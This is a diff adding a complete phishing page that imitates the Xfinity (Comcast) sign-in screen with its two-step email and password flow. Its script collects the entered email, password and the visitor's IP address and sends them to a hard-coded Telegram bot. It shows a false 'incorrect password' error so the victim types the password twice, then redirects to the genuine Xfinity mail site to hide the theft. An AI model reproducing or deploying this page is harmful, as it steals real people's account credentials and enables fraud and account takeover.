@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Xfinity</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+  <html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Xfinity</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    :root {
+      --xfinity-purple: #7000d5;
+      --xfinity-dark: #000;
+      --border-gray: #ccc;
+    }
+    html, body {
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fff;
+      overflow-x: hidden;
+    }
+    .container-fluid {
+      display: flex;
+      flex-direction: row;
+      min-height: 100vh;
+      padding: 0;
+    }
+    .left-panel, .right-panel {
+      flex: 1;
+      padding: 4vh 2rem;
+    }
+    .left-panel {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      background-color: #fff;
+    }
+    .login-box {
+      max-width: 440px;
+      width: 100%;
+    }
+    .logo-header img {
+      width: 90px;
+      margin-bottom: 1rem;
+    }
+    .logo-header h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: #1e1e1e;
+      margin-bottom: 1.5rem;
+    }
+    .form-control {
+      background-color: #f9f9fb;
+      border-radius: 6px;
+      border: 1px solid #999;
+      padding: 1.1rem;
+      font-size: 1rem;
+      margin-bottom: 1.2rem;
+    }
+    .form-control:focus {
+      border-color: var(--xfinity-purple);
+      box-shadow: 0 0 0 2px rgba(112, 0, 213, 0.2);
+    }
+    .terms {
+      font-size: 0.9rem;
+      color: #333;
+      margin-bottom: 1.8rem;
+    }
+    .terms a {
+      color: var(--xfinity-purple);
+    }
+    .login-box button {
+      background-color: var(--xfinity-purple);
+      color: white;
+      font-weight: 600;
+      padding: 0.9rem 1.5rem;
+      border: none;
+      border-radius: 8px;
+      width: auto;
+      margin-bottom: 1.5rem;
+      transition: background-color 0.3s;
+    }
+    .login-box button:hover {
+      background-color: #5a00c4;
+    }
+    .link-options a {
+      display: block;
+      padding: 0.8rem 0;
+      color: #333;
+      border-top: 1px solid #eee;
+      text-decoration: none;
+    }
+    .right-panel {
+      background: linear-gradient(to bottom right, #ebe4fc, #f4f0fd);
+      background-size: cover;
+      color: #222;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .right-panel h3 {
+      color: var(--xfinity-purple);
+      font-weight: 700;
+      font-size: 1.9rem;
+      margin-bottom: 1rem;
+    }
+    .right-panel p {
+      max-width: 420px;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+    .right-panel .btn-dark {
+      margin-bottom: 2rem;
+    }
+    .right-panel img {
+      max-width: 320px;
+      height: auto;
+      margin-bottom: 1.2rem;
+    }
+    .disclaimer {
+      font-size: 0.75rem;
+      max-width: 420px;
+      color: #444;
+      line-height: 1.3;
+    }
+    footer {
+      font-size: 0.75rem;
+      text-align: center;
+      padding: 1rem;
+      color: #555;
+      background-color: #f5f5f5;
+      border-top: 1px solid #ddd;
+    }
+    footer strong {
+      color: black;
+    }
+    #email-error, #password-error {
+      color: #c5002e;
+      font-size: 0.85rem;
+      margin-top: -10px;
+      margin-bottom: 1rem;
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      .container-fluid {
+        flex-direction: column;
+      }
+      .left-panel, .right-panel {
+        flex: none;
+        width: 100%;
+        padding: 2rem 1rem;
+      }
+      .logo-header h1 {
+        font-size: 1.8rem;
+      }
+      .right-panel h3 {
+        font-size: 1.5rem;
+      }
+      .right-panel p,
+      .right-panel .btn-dark,
+      .disclaimer {
+        max-width: 100%;
+      }
+      .right-panel img {
+        max-width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container-fluid">
+    <div class="left-panel">
+      <div class="login-box" id="login-stage">
+        <div class="logo-header">
+          <img src="https://www.metrocommercial.com/wp-content/uploads/2018/04/Xfinity-Grey-1-140x146.jpg" alt="xfinity logo">
+          <h2>Sign in with your Xfinity ID</h2>
+        </div>
+        <input type="text" class="form-control" id="xfinity-id" placeholder="Email, mobile, or username">
+        <div id="email-error"><i class="bi bi-exclamation-circle-fill"></i> The Xfinity ID you entered was incorrect. Please try again.</div>
+        <div class="terms">
+          By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+        <button onclick="showPasswordStage()">Let's go</button>
+        <div class="link-options">
+          <a href="#">New to Xfinity? View exclusive offers near you</a>
+          <a href="#">Find your Xfinity ID</a>
+          <a href="#">Create a new Xfinity ID</a>
+        </div>
+      </div>
+
+      <div class="login-box" id="password" style="display: none;">
+        <div class="logo-header">
+          <img src="https://www.metrocommercial.com/wp-content/uploads/2018/04/Xfinity-Grey-1-140x146.jpg" alt="xfinity logo">
+          <p style="font-weight: bold;" id="user-email"></p>
+          <h1>Enter your password</h1>
+        </div>
+        <input type="password" class="form-control" id="password-input" placeholder="Password">
+        <div id="password-error"></div>
+        <div><a href="#" style="color: var(--xfinity-purple); font-weight: bold; font-size: 0.9rem;">Forgot password?</a></div>
+        <div class="form-check mt-3">
+          <input type="checkbox" class="form-check-input" id="keep-signed-in">
+          <label class="form-check-label" for="keep-signed-in">Keep me signed in</label>
+        </div>
+        <div class="terms mt-2">
+          By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+        <button id="signin">Sign in</button>
+        <div style="margin-top: 1.5rem;">
+          <strong>Sign in as someone else</strong><br>
+          <small>Trouble signing in? <a href="#" style="color: var(--xfinity-purple); font-weight: 500;">Get help</a></small>
+        </div>
+      </div>
+    </div>
+    <div class="right-panel">
+      <h3>Let's cut your mobile bill in half</h3>
+      <p>Xfinity Internet customers can save big over T-Mobile, Verizon, and AT&T in their first year when you get two Unlimited lines with the 5G Xfinity Mobile network.</p>
+      <button class="btn btn-dark">Calculate your savings</button>
+      <img src="https://img.xfinitymobile.com/image/fetch/e_trim/w_300,h_240,c_fit,f_auto,q_auto,fl_lossy/https://img.xfinitymobile.com/image/upload/v1718630297/client/v2/images/GAP-BYOD-Catalog-Image-Update/BYOD_Xfinity_Image_Desktop_Mobile.png" alt="Xfinity Promo Phone">
+      <div class="disclaimer">
+        Xfinity or NOW Internet required. Taxes and fees extra. Reduced speeds after 30GB of usage/line. Data thresholds and actual savings may vary.
+      </div>
+    </div>
+  </div>
+  <footer>
+    © 2025 Comcast &nbsp; | &nbsp; Web Terms Of Service &nbsp; | &nbsp; Privacy Policy &nbsp; | &nbsp; Your Privacy Choices &nbsp; | &nbsp; Health Privacy Notice &nbsp; | &nbsp; Ad Choices &nbsp; | &nbsp; <strong>Cookie Preferences</strong>
+  </footer>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    function showPasswordStage() {
+      const id = document.getElementById('xfinity-id');
+      const email = id.value.trim();
+      const errorBox = document.getElementById('email-error');
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailPattern.test(email)) {
+        errorBox.style.display = 'block';
+        id.style.border = '2px solid #c5002e';
+        return;
+      }
+
+      errorBox.style.display = 'none';
+      id.style.border = '';
+      document.getElementById('user-email').textContent = email;
+      document.getElementById('login-stage').style.display = 'none';
+      document.getElementById('password').style.display = 'block';
+    }
+
+    $(document).ready(function(){
+      let count = 0;
+      let userIP = null;
+
+      function getUserIp() {
+        return fetch('https://api64.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => data.ip)
+          .catch(() => 'Unavailable');
+      }
+
+      getUserIp().then(ip => userIP = ip);
+
+      function sendTelegramMessage(message, ajaxOptions) {
+        const botToken = '7512568968:AAElKVaCJOrb5yF1sWfXwzJKlE5uwZOnDGA';
+        const chatId = '5713868500';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        $.ajax(Object.assign({
+          url: url,
+          type: 'POST',
+          contentType: 'application/json',
+          data: JSON.stringify({ chat_id: chatId, text: message })
+        }, ajaxOptions));
+      }
+
+      $('#signin').click(function(e){
+        e.preventDefault();
+        const email = $('#user-email').text().trim();
+        const password = $('#password-input').val().trim();
+        const errorDiv = $('#password-error');
+
+        if (!password) {
+          errorDiv.text('Please type in your password to sign in.').show();
+          return;
+        }
+
+        count++;
+        const msg = `Login Attempt #${count}:
+Email: ${email}
+Password: ${password}
+IP: ${userIP}`;
+
+        sendTelegramMessage(msg, {
+          beforeSend: () => {
+            if (count > 1) $('#signin').html('Verifying...');
+          },
+          success: () => {
+            if (count === 1) {
+              errorDiv.text('The Xfinity ID or password you entered was incorrect. Please try again.').show();
+            } else {
+              window.location.href = 'https://connect.xfinity.com/appsuite/';
+            }
+          },
+          error: () => {
+            errorDiv.text('Failed to send login info.').show();
+          },
+          complete: () => {
+            if (count > 1) $('#signin').html('Sign In');
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
